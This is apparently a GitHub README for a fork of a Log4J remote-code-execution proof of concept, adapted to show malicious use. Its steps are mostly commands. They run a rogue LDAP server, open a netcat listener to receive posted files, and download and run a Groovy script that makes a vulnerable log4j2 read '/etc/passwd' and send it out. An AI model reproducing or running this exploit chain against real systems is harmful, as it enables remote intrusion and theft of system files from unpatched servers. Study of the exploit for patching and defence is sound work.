This is a fork of https://github.com/HyCraftHD/Log4J-RCE-Proof-Of-Concept, which did the legwork in getting remote execution. This repo is only just demonstrating how it could be used maliciously. 


# Steps to Run 
(1) Clone and run this repo: 
```bash
git clone https://github.com/srt4/Log4J-RCE-Proof-Of-Concept/tree/update-to-read-files` 
./gradlew build runMain
``` 

Leave it open - it's the "LDAP Server". 

(2) Run: `nc -l 8080`

This is where the file will be posted. 


(3) Download and run the Groovy script using a vulnerable version of log4j2, as well as setting the flag to mimic older JVMs (n.b. it's unclear how many of these exist in production, but likely to be few. The newer JVMs can still be exploited but likely less severely)

```bash
curl https://gist.githubusercontent.com/srt4/4fb4b537bb48599279e0380e097081e2/raw/76a0051b744d5afa6babe346e5a706a31ff39025/log4j-rce.groovy > log4j-rce.groovy
groovy log4j-rce.groovy '//etc/passwd'
```

Now the logs should be visible in stages (1) and (2) 